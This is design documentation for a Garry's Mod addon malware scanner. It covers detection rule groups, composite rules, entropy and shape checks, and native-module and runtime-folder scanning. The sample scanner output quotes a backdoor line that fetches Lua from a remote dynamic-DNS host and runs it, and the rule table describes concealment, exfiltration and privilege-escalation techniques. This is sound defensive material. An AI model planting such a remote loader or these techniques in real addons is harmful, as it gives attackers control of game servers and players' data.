# How the scanner decides

What the rule groups look for, how findings are combined, why a file is judged
by shape as well as by content, and what happens to native modules and the
folders Garry's Mod writes at runtime. For running a scan, see the
[README](../README.md).

## What the rules cover

Grouped by what an attacker is trying to do, rather than by Lua construct:

| Group | Examples |
|---|---|
| Code execution | `RunString`, `CompileString`, execution functions passed as values, file contents executed |
| Remote and deferred | HTTP-fetched code, timers, hooks, net handlers, console commands, coroutines |
| Obfuscation | Base64, `string.char`, hex and decimal escapes, reversed literals, `%c` formatting, XOR and byte-pair decoders |
| Environment and registry | `getfenv`/`setfenv`, the `debug` library, `_G` lookups by computed key |
| Privilege escalation | `SetUserGroup`, overridden admin checks, ULX and SAM/ServerGuard/Evolve/CAMI, hardcoded SteamIDs |
| **Self-concealment** | overriding `file.Find`/`file.Read`, overriding core functions, enumerating and removing hooks, removing anticheat timers |
| **Inverted checks** | a dangerous branch guarded by `if not ply:IsAdmin()` |
| **Time-delayed activation** | comparing `os.time()` against a fixed future timestamp |
| **Persistence** | code stored in or loaded from SQL, files written and served to clients, client Lua from unusual paths |
| **Exfiltration** | SteamIDs or encoded data sent outbound, host and client fingerprinting |
| Exfiltration sources | Discord webhooks, bare-IP URLs, paste sites and shorteners, code-hosting raw URLs |
| Non-GMod APIs | `os.execute`, `io.*`, `ffi`, `package.loadlib` — removed by the sandbox, so foreign or probing code |
| Griefing | world-entity removal, mass kick and ban, map cleanup |
| **Economy** (tagged `darkrp`) | very large currency changes, code wired into a purchasable entity |
| **Runtime folders** | execution primitives, bytecode and encoded blobs under `data/`, `cache/`, `download/` and `lua_temp/` |
| **File shape** | packed lines, escape runs, whitespace-free source, look-alike identifiers, byte entropy |

The bold groups were added after probing the scanner with seventeen techniques
it had never been tested against; seven were missed entirely and four were only
caught incidentally by a generic rule. Self-concealment is the most valuable of
them: code that overrides `file.Find` so it does not appear in listings, or
enumerates every hook to remove someone else's anticheat, has no legitimate
reading at all.

## Composite rules

A single pattern is a single observation. `composite_rules.txt` expresses the
combinations that mean something the parts do not:

```
LUA-042 and (LUA-040 or LUA-041 or LUA-043);;;[CRITICAL] COMP-002 Hardcoded SteamID Plus Privilege Grant;;;...
```

The expression language over pattern IDs is `and`, `or`, `not`, parentheses and
`atleast(n, ID, ID, ...)`. Two properties matter:

**They are evaluated before the severity filter.** A hardcoded SteamID is
MEDIUM and granting admin is CRITICAL; on their own that is how they should be
ranked. Together they are a backdoor. Under `-s critical` the MEDIUM half used
to disappear and take the signature with it — now `COMP-002` still fires,
because composites see everything the scanner found, not what survived the
filter.

**Some span an addon or archive.** The existing `scan:` prefix combines files
within one addon, gamemode or GMA archive. Paths under `addons/<name>` and
`gamemodes/<name>` share that named root. Standard content folders such as
`lua/` and `materials/` share their parent; for other layouts, each immediate
subdirectory of the scan root is a separate group. Different archives always
remain separate. This catches a backdoor split across related files:

```
scan: LUA-008 and BIN-014;;;[CRITICAL] COMP-010 Split Loader And Payload;;;...
```

That is the case where one `.lua` reads and executes an asset file while the
payload sits Base64-encoded in a `.vmt` — neither file alarming alone.

Composites carry IDs, hints and test cases like any other rule;
`composite_rules.test.txt` gives each one a matching and a non-matching case,
and the self-check fails if either is missing. File-level rules are tested by
scanning a real snippet, cross-file rules with an `ids: LUA-008, BIN-014` form
that evaluates the expression directly. CLI integration tests additionally check
that separate addons and archives do not combine, while related files do.

## Shape, not signature

Every rule above asks whether a file contains something recognisable. That only
works for payloads somebody has already seen. Five checks ask a different
question -- what does this file look like -- and none of them needs to recognise
anything:

| ID | What it measures |
|----|------------------|
| `OBF-001` | A single line past 3000 characters with almost no spaces in it |
| `OBF-002` | Two hundred or more numeric or hex escapes |
| `OBF-003` | A file of real size with under 4% whitespace |
| `OBF-004` | Five or more identifiers built only from `l`, `I`, `1`, `O` and `0` |
| `OBF-005` | Byte entropy at or above 5.7 bits, closer to a blob than to source |

They run on `.lua` only. JSON is legitimately one long line with little
whitespace, and a `.vtf` is legitimately high-entropy; measuring either would
produce noise rather than findings.

The 5.7 threshold comes from measuring the corpus rather than from taste.
Ordinary Lua sits at 4.84 median and 5.23 at the widest; a table of bone
constants reaches 5.54; a Base64 payload wrapped in Lua reaches 6.01. Text in a
non-Latin script also runs high -- a Japanese localisation file scores 5.79 and
a Chinese one 6.30, above the payload -- so files that are largely valid
non-ASCII UTF-8 are not measured at all. The cost of that exemption is a payload
smuggled as valid UTF-8, which `OBF-001` to `OBF-004` and the Base64 rules still
see.

One signal alone has honest explanations -- a generated table, a vendored
minified library -- so one signal alone is not a verdict. `COMP-023` fires on two
of them together, and `COMP-022` on any one of them next to code execution. That
is the combination that catches a packer nobody has written a pattern for yet.

## Native modules

A Garry's Mod binary module is compiled code with full access to the process. The
scanner cannot read what it does, and it never claims to. What it can read is the
string table, and a module that talks to somewhere still has to spell out where:

```
lua/bin/gmsv_winsys_linux.dll
  [Critical] MOD-010  Remote Lua Source URL In A Native Module
           local res = http.request('http://gpwn.zapto.org:1337/raw.lua') load(res)()
  [High    ] MOD-014  Dynamic DNS Hostname In A Native Module
```

That line is the whole backdoor, sitting in plain text inside 413 KB of compiled
code. Before this existed the file produced `MOD-001 cannot be scanned` and
nothing else; a `.so` that was not named `gmsv_` produced nothing at all.

`module_patterns.txt` runs against the printable runs pulled out of the file, one
per line, including UTF-16 text. It looks for network endpoints and hardcoded
identities: URLs ending in `.lua`, bare IP addresses, paste sites, Discord
webhooks, dynamic-DNS hostnames, SteamIDs and long encoded blobs.

What it deliberately does not look for is the names of Lua functions. Every
Garry's Mod module is a Lua binding, so `loadstring` and `RunString` sit in the
symbol table of entirely ordinary ones. The sample above contains `loadstring`
exactly once, for that reason, and its actual payload was the URL.

A finding here is a reason to verify the module against its published build. It is
not a verdict, and reading strings will never tell you what compiled code does.

## Runtime folders

`file.Write` cannot create a `.lua` file, so a payload that has to survive on
disk is parked somewhere the game is allowed to write: `data/`, `cache/`,
`download/` or `lua_temp/`, under an extension like `.txt`, `.dat` or `.json`.
A small loader elsewhere reads it back and runs it. Neither half looks like much
on its own.

`data_patterns.txt` covers those four folders and only those four folders. The
same `RunString` in an addon's own `config.txt` is not what these rules are
about, and a `.txt` outside a runtime folder is never even opened. Nothing else
in Garry's Mod writes code there, so a match is worth reading immediately:

```
data/payload.txt
  [Critical] DATA-001:1  Execution Primitive In A Runtime Data File
           RunString(secret)
```

The matching loader turns up as `LUA-008`, and `COMP-010` ties the two together
when they sit in the same addon.
